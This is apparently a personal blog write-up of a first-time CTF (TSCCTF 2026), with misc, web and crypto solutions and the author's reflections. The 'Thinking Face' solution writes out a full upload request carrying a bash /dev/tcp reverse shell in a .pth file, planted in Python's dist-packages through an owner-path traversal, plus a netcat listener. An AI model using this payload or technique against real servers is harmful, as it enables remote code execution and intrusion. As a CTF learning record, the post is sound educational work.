<!DOCTYPE html>
<html lang="en-us">

<head>
    <title>
[CTF] TSCCTF 2026 Write-up and some of my thoughts | xid3
</title>

    <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="">

<meta name="generator" content="Hugo 0.155.3">


<link rel="canonical" href="https://xxid3.github.io/post/tscctf2026/" >




<link href="/css/style.min.5eb7b193e6ce9eab3699821eb02b4c553c6cc064c913d2659ac37624d9b7520d.css" rel="stylesheet">




</head>

<body>

    <div class="flexWrapper">
        <header class="headerWrapper">
    <div class="header">
        <div>
            <a class="terminal" href="/">
                <span>xid3@home ~ $</span>
            </a>
        </div>
        <input class="side-menu" type="checkbox" id="side-menu">
        <label class="hamb" for="side-menu"><span class="hamb-line"></span></label>
        <nav class="headerLinks">
            <ul>
                
                <li>
                    <a href="https://xxid3.github.io/about" title="" >
                        ~/about</a>
                </li>
                
                <li>
                    <a href="https://xxid3.github.io/articles" title="" >
                        ~/articles</a>
                </li>
                
            </ul>
        </nav>
    </div>
</header>


        <div class="content">
            <main class="main">
                
<div class="postWrapper">
    <h1>[CTF] TSCCTF 2026 Write-up and some of my thoughts</h1>
    

    
    
    
    

    
    
    
    
    

    
    
    
    
    

    
    
    
    

    
    
    
    

    
    
    
    

    
    <section class="postMetadata">
        <dl>
            
                
<dt>tags</dt>
<dd><span></span>
    <a href="/tags/ctf/">#CTF</a></dd>
            
            
            
            
                <dt>published</dt>
                 
                 
                 <dd><time datetime="2026-03-01">2026-03-01</time></dd>
            
            
        </dl>
    </section>
    
    <div>
        <h2 id="my-thoughts">My thoughts</h2>
<p>This is my first time to participate in CTF competition, though I&rsquo;ve gotten into cybersecurity field since the last summer. In the past few months, most time I just leared some basic ideas of web penetration testing (and not yet fininished lol) on HTB, and also played some beginner labs on picoCTF.
In this competition, I found that most of the web problems in CTF are not straightforward, I can&rsquo;t solve them with just a single approach, like just using SQLi or command injection.</p>
<p>The second thing I found is that the key concepts being tested in web CTF are more like code reviewing or finding logic vulnerabilities in web app (white box pentesting), the common vulnerabilities of web app (such as SQLi just mentioned) are like background knowledges you should know, so I thought that the barrier to entry for web CTF is higher than my expected before.</p>
<p>Finally, since I joined this CTF&rsquo;s discord server, I found that a part of people used LLM agents to solve most of the challenges (almost all challenges), I started to think if I should continue to work on CTF as LLM can do perfectly on this kind of competition, and I don&rsquo;t know whether CTF will vanish in the next few years.</p>
<p>Anyway, I really enjoy cybersecurity and everything related to IT, now I will keep learing on web penetration testing.</p>
<h2 id="write-up">Write-up</h2>
<p>I only solve very few problems, this write-up is just for recording the experiences I had.</p>
<h3 id="misc">Misc</h3>
<h4 id="welcome">Welcome</h4>
<ul>
<li>Describtion:<br>
The flag is on TSCCTF&rsquo;s latest Facebook post!</li>
<li>Solution:<br>
<img src="https://hackmd.io/_uploads/Sk3a7wZFZg.png" alt="image">
Base64 decode the bottom string.
<code>Flag: TSC{Welcome_2_TSCCTF_2026$$$}</code></li>
</ul>
<h4 id="on-some-integrated-numinous-transportation">On Some Integrated Numinous Transportation</h4>
<ul>
<li>Describtion:<br>
This is an OSINT challenge
Your friend post an image on facebook when traveling. Seems like it is taken on some kind of transportation. Can you find out which the transportation is?
Flag format: <code>TSC{&lt;transportation name in all lower case&gt;}</code>
For example. If the answer is Taiwan High Speed Rail. The flag will be <code>TSC{taiwan_high_speed_rail}</code>
The SHA1 hash for the correct flag is <code>f23d3ecff0b498df38134b266f59a66ceb7e7c82</code> (no line feed)</li>
<li>Solution:<br>
Saw 101 in the picture, and there are some cables in the above of picture, so I guess it is <code>Maokong Gondola</code>.
The SHA1 hash of <code>TSC{maokong_gondola}</code> is <code>f23d3ecff0b498df38134b266f59a66ceb7e7c82</code>, so the guess is right.
<code>Flag: TSC{maokong_gondola}</code></li>
</ul>
<h3 id="web">Web</h3>
<h4 id="py-party">PY Party</h4>
<ul>
<li>Describtion:<br>

<a href="https://www.youtube.com/watch?v=qFWBoP5Zl-E" target="_blank" rel="noopener">PY Party</a>
</li>
<li>Solution:<br>
Seems this video is not associated with the challenge.
Let&rsquo;s first take a look at its source codes:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>cur<span style="color:#f92672">.</span>execute(
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;INSERT INTO posts (title, body, is_private, author_id) VALUES (?, ?, ?, ?)&#34;</span>,
</span></span><span style="display:flex;"><span>    (
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Welcome&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Welcome to the blog!&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">2</span>,
</span></span><span style="display:flex;"><span>    ),
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>cur<span style="color:#f92672">.</span>execute(
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;INSERT INTO posts (title, body, is_private, author_id) VALUES (?, ?, ?, ?)&#34;</span>,
</span></span><span style="display:flex;"><span>    (
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Flag&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>FLAG<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>    ),
</span></span><span style="display:flex;"><span>)
</span></span></code></pre></div>and
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>cur<span style="color:#f92672">.</span>execute(
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;INSERT INTO users (username, password_hash, is_admin) VALUES (?, ?, ?)&#34;</span>,
</span></span><span style="display:flex;"><span>    (<span style="color:#e6db74">&#34;guest&#34;</span>, generate_password_hash(<span style="color:#e6db74">&#34;guest123&#34;</span>), <span style="color:#ae81ff">0</span>),
</span></span><span style="display:flex;"><span>)
</span></span></code></pre></div>It inserted a post that may contains the flag into posts table, which id may be 2.
Logined as <code>guest:guest123</code>, I visited <code>http://172.31.4.2:40011/post?id=2</code>, but the response is 403 forbidden.
Let&rsquo;s look at this snippet in <code>@app.route(&quot;/post&quot;)</code>:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>primary_id <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;id&#34;</span>, type<span style="color:#f92672">=</span>int)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> primary_id <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#34;index&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>gate_post <span style="color:#f92672">=</span> load_post(primary_id)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> gate_post:
</span></span><span style="display:flex;"><span>    abort(<span style="color:#ae81ff">404</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> gate_post[<span style="color:#e6db74">&#34;is_private&#34;</span>] <span style="color:#f92672">and</span> <span style="color:#f92672">not</span> user[<span style="color:#e6db74">&#34;is_admin&#34;</span>] <span style="color:#f92672">and</span> gate_post[<span style="color:#e6db74">&#34;author_id&#34;</span>] <span style="color:#f92672">!=</span> user[<span style="color:#e6db74">&#34;id&#34;</span>]:
</span></span><span style="display:flex;"><span>    abort(<span style="color:#ae81ff">403</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span>raw_query <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>query_string<span style="color:#f92672">.</span>decode()
</span></span><span style="display:flex;"><span>params <span style="color:#f92672">=</span> dict(sorted(parse_qsl(raw_query, keep_blank_values<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>selected_id <span style="color:#f92672">=</span> params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;id&#34;</span>, primary_id)
</span></span></code></pre></div>You can see that this app uses two different functions to handle the requested post id, the first <code>primary_id = request.args.get(&quot;id&quot;, type=int)</code> will only receive the first id we supply, and check if it is not private and the author id is our id (guest).
The second <code>raw_query = request.query_string.decode()</code> and
<code>params = dict(sorted(parse_qsl(raw_query, keep_blank_values=True)))</code> will also receive one of id we supply, but the <code>dict(sorted())</code> will reserve the biggest id value as the final value (since <code>dict()</code> will only reserve the final element while there are more than one elements with the same key), so we can structure our payload as: <code>http://172.31.4.2:40011/post?id=1&amp;id=2</code>, then we can see the post which id = 2.
<code>Flag: TSCCTF{Ha_Ha_PY_ppppparty_79e611e4d3b91903}</code></li>
</ul>
<h4 id="thinking-face">ü§îThinking Face</h4>
<ul>
<li>
<p>Describtion:<br>
Thinking Face is a machine learning and AI platform that helps developers, researchers, and organizations to share ML models. It provides the Thinking Face Hub, a centralized repository where users can discover numerous open-source models, download them, share them, and collaborate with the community.</p>
</li>
<li>
<p>Solution:<br>
After registering an accout and logging in, I see that the <code>admin</code> had one model, and I don&rsquo;t have any. On this web app, what I can do are just see other&rsquo;s models, logout and see my models but nothing. Then I took a look at its source codes:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">elif</span> action <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;upload&#39;</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> token <span style="color:#f92672">or</span> (user<span style="color:#f92672">:=</span> get_session_user(token)) <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>        print()
</span></span><span style="display:flex;"><span>        print(json<span style="color:#f92672">.</span>dumps({<span style="color:#e6db74">&#39;ok&#39;</span>: <span style="color:#66d9ef">False</span>, <span style="color:#e6db74">&#39;error&#39;</span>: <span style="color:#e6db74">&#39;not authenticated&#39;</span>}))
</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    form <span style="color:#f92672">=</span> get_http_form()
</span></span><span style="display:flex;"><span>    name <span style="color:#f92672">=</span> form[<span style="color:#e6db74">&#39;name&#39;</span>] <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;name&#39;</span> <span style="color:#f92672">in</span> form <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>    description <span style="color:#f92672">=</span> form[<span style="color:#e6db74">&#39;description&#39;</span>] <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;description&#39;</span> <span style="color:#f92672">in</span> form <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    file <span style="color:#f92672">=</span> form[<span style="color:#e6db74">&#39;file&#39;</span>] <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;file&#39;</span> <span style="color:#f92672">in</span> form <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">None</span>
</span></span></code></pre></div><p>which indicated that I can upload my model with parameters <code>name</code> and <code>file</code>, maybe I can perform <strong>file upload attacks</strong>.
Then I found another function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">elif</span> action <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;change_owner&#39;</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> token <span style="color:#f92672">or</span> (user<span style="color:#f92672">:=</span> get_session_user(token)) <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>        print()
</span></span><span style="display:flex;"><span>        print(json<span style="color:#f92672">.</span>dumps({<span style="color:#e6db74">&#39;ok&#39;</span>: <span style="color:#66d9ef">False</span>, <span style="color:#e6db74">&#39;error&#39;</span>: <span style="color:#e6db74">&#39;not authenticated&#39;</span>}))
</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    model_id <span style="color:#f92672">=</span> qs<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;id&#39;</span>, [<span style="color:#e6db74">&#39;&#39;</span>])[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>    new_owner <span style="color:#f92672">=</span> qs<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;new_owner&#39;</span>, [<span style="color:#e6db74">&#39;&#39;</span>])[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> model_id <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> model_id<span style="color:#f92672">.</span>isdigit() <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> new_owner <span style="color:#f92672">or</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;[^a-zA-Z0-9_\-/]&#39;</span>, new_owner):
</span></span><span style="display:flex;"><span>        print()
</span></span><span style="display:flex;"><span>        print(json<span style="color:#f92672">.</span>dumps({<span style="color:#e6db74">&#39;ok&#39;</span>: <span style="color:#66d9ef">False</span>, <span style="color:#e6db74">&#39;error&#39;</span>: <span style="color:#e6db74">&#39;bad parameters&#39;</span>}))
</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span>success, msg <span style="color:#f92672">=</span> change_model_owner(int(model_id), new_owner)
</span></span><span style="display:flex;"><span>shutil<span style="color:#f92672">.</span>move(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(MODELS_DIR, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>model[<span style="color:#e6db74">&#39;owner&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{</span>model[<span style="color:#e6db74">&#39;filename&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>),
</span></span><span style="display:flex;"><span>            os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(MODELS_DIR, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>new_owner<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{</span>model[<span style="color:#e6db74">&#39;filename&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>))
</span></span></code></pre></div><p>Now I can change the model&rsquo;s owner, and this web app will change the model file to the new owner&rsquo;s directory. And there are 2 flaws in this snippet:</p>
<ol>
<li><code>success, msg = change_model_owner(int(model_id), new_owner)</code> didn&rsquo;t check if the new owner actually exists in DB.</li>
<li>In <code>os.path.join(MODELS_DIR, f&quot;{new_owner}/{model['filename']}&quot;)</code>, if the second parameter starts with <code>/</code>, it will cover the first parameter and the final path return will only be the second parameter.</li>
</ol>
<p>Based on these points, we can structure the payload:</p>
<pre tabindex="0"><code>GET /cgi-bin/models.py?action=upload HTTP/1.1
Host: 172.31.1.2:31039
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Referer: http://172.31.1.2:31039/models.html
Cookie: session=2c8a48e7fb8f4166a8a39c7a16b9d8ea
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 328

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name=&#34;name&#34;

myshell
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;payload.pth&#34;

import os; os.system(&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/172.30.64.10/9001 0&gt;&amp;1&#34;&#39;)
------WebKitFormBoundary7MA4YWxkTrZu0gW--
</code></pre><p>which sends a reverse shell to the web server, then change the owner to: <code>/usr/lib/python3/dist-packages</code>.
The reason is that when we request anything that triggers the cgi program, the Python on server will use <code>site</code> module first to scan all the global module directories (to <code>sys.path</code>) it needs to run the program correctly. One of the global module directories is <code>/usr/lib/python3/dist-packages</code>, which means when we request anything like <code>auth.py</code>, the web server will visit the <code>/usr/lib/python3/dist-packages</code> and collect all paths it needs.
The other mechanism is that if there is a line begin with <code>import XXX</code> in the <code>.pth</code> file, the <code>site</code> module will directly executes this line instead of including it to <code>sys.path</code> as a path, so based on this, we can write a reverse shell to force the server execute it.
<code>nc -lvnp 9001</code> listening on 9001 to get the reverse shell, and go to the website to send any cgi-bin request, then we RCE the server and get the flag.</p>
<pre tabindex="0"><code>www-data@26db84900e39:/var/www/cgi-bin$ cat /flag.txt
cat /flag.txt
TSC{Tr3ndy_AI_W17h_0ld_f4sh1on__25937ab87dfc422dba394c6ce2a8cb55}
</code></pre><p><code>Flag: TSC{Tr3ndy_AI_W17h_0ld_f4sh1on__25937ab87dfc422dba394c6ce2a8cb55}</code></p>
</li>
</ul>
<h3 id="crypto">Crypto</h3>
<h4 id="lattice">Lattice</h4>
<ul>
<li>Describtion:<br>
Easy one, solve it.</li>
<li>Solution:<br>
Thanks for Gemini 3.1 Pro.
exploit code:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> long_to_bytes
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> hashlib <span style="color:#f92672">import</span> sha256
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Â∑≤Áü•Êï∏Êìö </span>
</span></span><span style="display:flex;"><span>m <span style="color:#f92672">=</span> <span style="color:#ae81ff">18446744073709551616</span>
</span></span><span style="display:flex;"><span>a <span style="color:#f92672">=</span> <span style="color:#ae81ff">10176098343636197767</span>
</span></span><span style="display:flex;"><span>b <span style="color:#f92672">=</span> <span style="color:#ae81ff">12298458670738556881</span>
</span></span><span style="display:flex;"><span>outputs <span style="color:#f92672">=</span> [<span style="color:#ae81ff">3263751489</span>, <span style="color:#ae81ff">2794058500</span>, <span style="color:#ae81ff">2599739732</span>, <span style="color:#ae81ff">541826760</span>, <span style="color:#ae81ff">2524158971</span>, <span style="color:#ae81ff">3310397546</span>, <span style="color:#ae81ff">1256279121</span>, <span style="color:#ae81ff">1738597237</span>, <span style="color:#ae81ff">3440678068</span>, <span style="color:#ae81ff">2521988223</span>]
</span></span><span style="display:flex;"><span>enc_hex <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;03a40935dc788695dd54157601df8fb3f50b2b0ef874024c241f5e1d41ae3d45c6add9f4008c0b1567fc4f07f08e9cc9fe0c1a22a8008c44dba9a8186d244b03&#34;</span>
</span></span><span style="display:flex;"><span>enc <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(enc_hex)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1. ÁàÜÁ†¥ s1 ÁöÑ‰Ωé 32 ‰ΩçÂÖÉ </span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Ê≠£Âú®ÈÇÑÂéü LCG ÁãÄÊÖã...&#34;</span>)
</span></span><span style="display:flex;"><span>high_s1 <span style="color:#f92672">=</span> outputs[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>target_high_s2 <span style="color:#f92672">=</span> outputs[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>found_s <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span><span style="color:#f92672">**</span><span style="color:#ae81ff">32</span>):
</span></span><span style="display:flex;"><span>    current_s <span style="color:#f92672">=</span> high_s1 <span style="color:#f92672">+</span> k
</span></span><span style="display:flex;"><span>    next_s <span style="color:#f92672">=</span> (a <span style="color:#f92672">*</span> current_s <span style="color:#f92672">+</span> b) <span style="color:#f92672">%</span> m
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (next_s <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>) <span style="color:#f92672">==</span> target_high_s2:
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># ÈÄ≤‰∏ÄÊ≠•È©óË≠âÁ¨¨‰∏âÂÄãËº∏Âá∫‰ª•Á¢∫‰øùÂîØ‰∏ÄÊÄß</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ((a <span style="color:#f92672">*</span> next_s <span style="color:#f92672">+</span> b) <span style="color:#f92672">%</span> m) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span> <span style="color:#f92672">==</span> outputs[<span style="color:#ae81ff">2</span>]:
</span></span><span style="display:flex;"><span>            found_s <span style="color:#f92672">=</span> current_s
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;ÊâæÂà∞ÂéüÂßãÁãÄÊÖã s1: </span><span style="color:#e6db74">{</span>found_s<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> found_s:
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 2. ÊºîÈÄ≤Âà∞ÊúÄÂæå‰∏ÄÂÄãÁãÄÊÖã s10 </span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Ê≥®ÊÑèÔºöÂéüÊú¨Á®ãÂºèÁ¢º‰∏≠ outputs Â∑≤Á∂ìË∑ë‰∫Ü 10 Ê¨°Ëø¥ÂúàÔºåÊúÄÂæåÁöÑ s ÊòØ outputs[-1] Â∞çÊáâÁöÑÁãÄÊÖã </span>
</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> found_s
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">10</span>):
</span></span><span style="display:flex;"><span>        s <span style="color:#f92672">=</span> (a <span style="color:#f92672">*</span> s <span style="color:#f92672">+</span> b) <span style="color:#f92672">%</span> m
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 3. Ëß£ÂØÜ AES </span>
</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> sha256(long_to_bytes(s))<span style="color:#f92672">.</span>digest()[:<span style="color:#ae81ff">16</span>]
</span></span><span style="display:flex;"><span>    cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, AES<span style="color:#f92672">.</span>MODE_ECB)
</span></span><span style="display:flex;"><span>    flag <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(enc)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Ëß£ÂØÜÁµêÊûú: </span><span style="color:#e6db74">{</span>flag<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>strip()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Êú™ËÉΩÊâæÂà∞ÁãÄÊÖãÔºåË´ãÊ™¢Êü•ÂèÉÊï∏„ÄÇ&#34;</span>)
</span></span></code></pre></div><code>Flag: TSCCTF{LLL_c4n_r3c0v3r_h1dd3n_b1ts_fr0m_truncat3d_LCG!}</code></li>
</ul>
<h2 id="overall-place">Overall place</h2>
<p>47th / 115, I really satisfy with the result as my first time participating in CTF.</p>

    </div>
</div>

            </main>
        </div>


        <footer class="footer">
    
        <span>
            ¬© 2026 xid3, Built with
            <a href="https://gohugo.io" class="footerLink">Hugo</a> and
            <a href="https://github.com/LordMathis/hugo-theme-nightfall" class="footerLink">Nightfall</a> theme
        </span>
    
</footer>
    </div>

</body>

</html>
